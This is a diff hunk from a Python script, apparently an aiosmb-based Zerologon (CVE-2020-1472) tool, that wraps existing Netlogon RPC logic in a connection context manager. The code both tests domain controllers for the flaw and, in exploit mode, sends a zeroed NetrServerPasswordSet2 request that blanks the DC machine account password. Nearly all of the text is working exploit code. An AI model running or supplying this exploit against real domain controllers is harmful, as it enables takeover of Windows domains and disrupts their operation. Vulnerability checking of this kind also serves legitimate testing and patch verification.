@@ -99,61 +99,61 @@ async def run(dc_name, dc_ip, exploit = False):
 	url = SMBConnectionURL('smb2+ntlm-password://XXX\\aaa:aaa@%s' % dc_name) # dummy url to speed up the process..
 	connection = url.get_connection()
 
-
-	epm = EPM(connection, protocol = 'ncacn_ip_tcp')
-	_, err = await epm.connect()
-	if err is not None:
-		raise err
-	stringBinding, err = await epm.map(nrpc.MSRPC_UUID_NRPC)
-	_, err = await epm.connect()
-	if err is not None:
-		raise err
-
-	dce = epm.get_connection_from_stringbinding(stringBinding)
-	#dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
-
-	_, err = await dce.connect()
-	if err is not None:
-		raise err
-	_, err = await dce.bind(nrpc.MSRPC_UUID_NRPC)
-	if err is not None:
-		raise err
-
-	for _ in range(0, MAX_ATTEMPTS):
-		print('=====================================================')
-		_, err = await nrpc.hNetrServerReqChallenge(dce, dc_handle + '\x00', target_computer + '\x00', plaintext)
+	with connection:
+		epm = EPM(connection, protocol = 'ncacn_ip_tcp')
+		_, err = await epm.connect()
 		if err is not None:
 			raise err
-		
-		if exploit is False:
-			server_auth, err = await nrpc.hNetrServerAuthenticate3(
-				dce, dc_handle + '\x00', target_computer + '$\x00', nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
-				target_computer + '\x00', ciphertext, flags
-			)
-		else:
-			authenticator = nrpc.NETLOGON_AUTHENTICATOR()
-			authenticator['Credential'] = b'\x00' * 8
-			authenticator['Timestamp'] = 0
-			server_auth, err = await nrpc.hNetrServerPasswordSet2(
-				dce, dc_handle + '\x00', target_computer + '$\x00', nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel, 
-				target_computer + '\x00', authenticator, b'\x00' * 516
-			)
-
-
+		stringBinding, err = await epm.map(nrpc.MSRPC_UUID_NRPC)
+		_, err = await epm.connect()
 		if err is not None:
-			if err.get_error_code() == 0xc0000022:
-				continue
-			else:
-				raise err
-		
-		if server_auth['ErrorCode'] == 0:
-			print('Server is vulnerable!')
-			break
-	
-	else:
-		print('FAILED!')
+			raise err
 
-	await dce.disconnect()
+		dce = epm.get_connection_from_stringbinding(stringBinding)
+		#dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
+
+		_, err = await dce.connect()
+		if err is not None:
+			raise err
+		_, err = await dce.bind(nrpc.MSRPC_UUID_NRPC)
+		if err is not None:
+			raise err
+
+		for _ in range(0, MAX_ATTEMPTS):
+			print('=====================================================')
+			_, err = await nrpc.hNetrServerReqChallenge(dce, dc_handle + '\x00', target_computer + '\x00', plaintext)
+			if err is not None:
+				raise err
+			
+			if exploit is False:
+				server_auth, err = await nrpc.hNetrServerAuthenticate3(
+					dce, dc_handle + '\x00', target_computer + '$\x00', nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
+					target_computer + '\x00', ciphertext, flags
+				)
+			else:
+				authenticator = nrpc.NETLOGON_AUTHENTICATOR()
+				authenticator['Credential'] = b'\x00' * 8
+				authenticator['Timestamp'] = 0
+				server_auth, err = await nrpc.hNetrServerPasswordSet2(
+					dce, dc_handle + '\x00', target_computer + '$\x00', nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel, 
+					target_computer + '\x00', authenticator, b'\x00' * 516
+				)
+
+
+			if err is not None:
+				if err.get_error_code() == 0xc0000022:
+					continue
+				else:
+					raise err
+			
+			if server_auth['ErrorCode'] == 0:
+				print('Server is vulnerable!')
+				break
+		
+		else:
+			print('FAILED!')
+
+		await dce.disconnect()
 
 def main():
 	import argparse
